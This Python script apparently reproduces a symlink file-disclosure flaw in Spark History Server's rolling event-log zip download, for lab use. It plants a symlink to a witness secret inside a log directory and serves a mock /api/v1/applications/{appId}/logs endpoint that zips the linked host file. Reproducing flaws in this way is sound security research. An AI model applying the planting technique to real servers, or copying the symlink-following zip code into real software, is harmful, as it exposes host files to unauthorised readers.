#!/usr/bin/env python3
"""History Server gadget of EventLogFileReaders.scala rolling zip dump.

RollingEventLogFilesFileReader.zipEventLogFiles (pin v4.2.0 ~267-272) dumps
every listStatus child via FileSystem.open. LocalFileSystem follows a POSIX
symlink, so a planted child whose target sits outside spark.history.fs.logDirectory
is packed into GET /api/v1/applications/{appId}/logs.

This is not a full Spark History Server and does not parse Event JSON through
Jackson (CVE-2025-54920 stays closed).
"""

from __future__ import annotations

import json
import os
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from io import BytesIO
from pathlib import Path
from urllib.parse import unquote

LABEL = "SPARK-HISTORY-ZIP-SYMLINK"
WITNESS = "SPARK-HISTORY-ZIP-SYMLINK-WITNESS"
EVENT_LOG_DIR_NAME_PREFIX = "eventlog_v2_"
EVENT_LOG_FILE_NAME_PREFIX = "events_"
APPSTATUS_FILE_NAME_PREFIX = "appstatus_"
SYMLINK_NAME = "planted-secret"


def env_path(name: str, default: str) -> Path:
    return Path(os.environ.get(name, default))


def env_str(name: str, default: str) -> str:
    return os.environ.get(name, default)


BIND_HOST = env_str("BIND_HOST", "0.0.0.0")
BIND_PORT = int(env_str("BIND_PORT", "18080"))
LOG_DIR = env_path("LOG_DIR", "/tmp/spark-events")
SECRET_PATH = env_path("SECRET_PATH", "/secret/host-secret")
APP_ID = env_str("APP_ID", "app-2026-0001")
WITNESS_VALUE = env_str("WITNESS", WITNESS)


def log(msg: str) -> None:
    print(msg, flush=True)


def is_event_log_file(path: Path) -> bool:
    # Hadoop FileStatus.isFile follows the symlink; a link to a file counts.
    return path.name.startswith(EVENT_LOG_FILE_NAME_PREFIX) and path.is_file()


def is_app_status_file(path: Path) -> bool:
    return path.name.startswith(APPSTATUS_FILE_NAME_PREFIX) and path.is_file()


def list_status(root: Path) -> list[Path]:
    """fs.listStatus(rootPath) - names in the dir, not resolved targets."""
    return sorted((child for child in root.iterdir()), key=lambda item: item.name)


def add_file_as_zip_entry(archive: zipfile.ZipFile, path: Path, entry_name: str) -> None:
    # EventLogFileReaders.scala:48-56 FileSystem.open then transferTo.
    # LocalFileSystem.open follows POSIX symlinks (no O_NOFOLLOW).
    with path.open("rb") as handle:
        archive.writestr(entry_name, handle.read())


def zip_event_log_files(root_path: Path) -> bytes:
    """RollingEventLogFilesFileReader.zipEventLogFiles (scala ~267-272)."""
    files = list_status(root_path)
    if not any(is_event_log_file(item) for item in files):
        raise FileNotFoundError("Log directory must contain at least one event log file!")
    if not any(is_app_status_file(item) for item in files):
        raise FileNotFoundError("Log directory must contain an appstatus file!")

    buf = BytesIO()
    with zipfile.ZipFile(buf, mode="w", compression=zipfile.ZIP_DEFLATED) as archive:
        dir_entry_name = root_path.name + "/"
        archive.writestr(dir_entry_name, b"")
        for child in files:
            add_file_as_zip_entry(archive, child, dir_entry_name + child.name)
    return buf.getvalue()


def plant_rolling_log() -> Path:
    """Attacker-writable log dir plus a symlink to a host file outside it."""
    rolling = LOG_DIR / f"{EVENT_LOG_DIR_NAME_PREFIX}{APP_ID}"
    rolling.mkdir(parents=True, exist_ok=True)
    SECRET_PATH.parent.mkdir(parents=True, exist_ok=True)
    SECRET_PATH.write_text(f"{WITNESS_VALUE}\n", encoding="utf-8")
    SECRET_PATH.chmod(0o600)

    (rolling / f"{APPSTATUS_FILE_NAME_PREFIX}{APP_ID}").write_bytes(b"")
    events = rolling / f"{EVENT_LOG_FILE_NAME_PREFIX}1_{APP_ID}"
    # Benign SparkListenerEvent JSON only. Do not plant an Event class gadget.
    events.write_text(
        '{"Event":"SparkListenerLogStart","Spark Version":"4.2.0"}\n'
        '{"Event":"SparkListenerApplicationStart","App Name":"lab",'
        f'"App ID":"{APP_ID}","Timestamp":1,"User":"lab"}}\n',
        encoding="utf-8",
    )

    planted = rolling / SYMLINK_NAME
    if planted.exists() or planted.is_symlink():
        planted.unlink()
    planted.symlink_to(SECRET_PATH)
    log(
        f"ioc planted rolling={rolling} symlink={planted} "
        f"target={SECRET_PATH} witness={WITNESS_VALUE}"
    )
    return rolling


class HistoryHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt: str, *args: object) -> None:
        log(f"http {self.address_string()} {fmt % args}")

    def _send(self, status: int, body: bytes, content_type: str, extra: dict[str, str] | None = None) -> None:
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        if extra:
            for key, value in extra.items():
                self.send_header(key, value)
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self) -> None:
        path = unquote(self.path.split("?", 1)[0])
        if path in {"/", "/health"}:
            payload = json.dumps({"status": "ok", "label": LABEL, "appId": APP_ID}).encode("utf-8")
            self._send(200, payload, "application/json")
            return
        if path == "/api/v1/applications":
            payload = json.dumps([{"id": APP_ID, "name": "lab"}]).encode("utf-8")
            self._send(200, payload, "application/json")
            return

        prefix = "/api/v1/applications/"
        suffix = "/logs"
        if path.startswith(prefix) and path.endswith(suffix):
            app_id = path[len(prefix) : -len(suffix)]
            if not app_id or "/" in app_id:
                self._send(404, b"not found\n", "text/plain; charset=utf-8")
                return
            root = LOG_DIR / f"{EVENT_LOG_DIR_NAME_PREFIX}{app_id}"
            try:
                blob = zip_event_log_files(root)
            except (FileNotFoundError, NotADirectoryError, OSError) as exc:
                msg = f"Event logs are not available for app: {app_id}. {exc}\n"
                self._send(503, msg.encode("utf-8"), "text/plain; charset=utf-8")
                return
            filename = f"eventLogs-{app_id}.zip"
            self._send(
                200,
                blob,
                "application/octet-stream",
                extra={"Content-Disposition": f"attachment; filename={filename}"},
            )
            return

        self._send(404, b"not found\n", "text/plain; charset=utf-8")


def main() -> int:
    plant_rolling_log()
    server = ThreadingHTTPServer((BIND_HOST, BIND_PORT), HistoryHandler)
    log(f"ioc listen={BIND_HOST}:{BIND_PORT} logDir={LOG_DIR} label={LABEL}")
    server.serve_forever()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
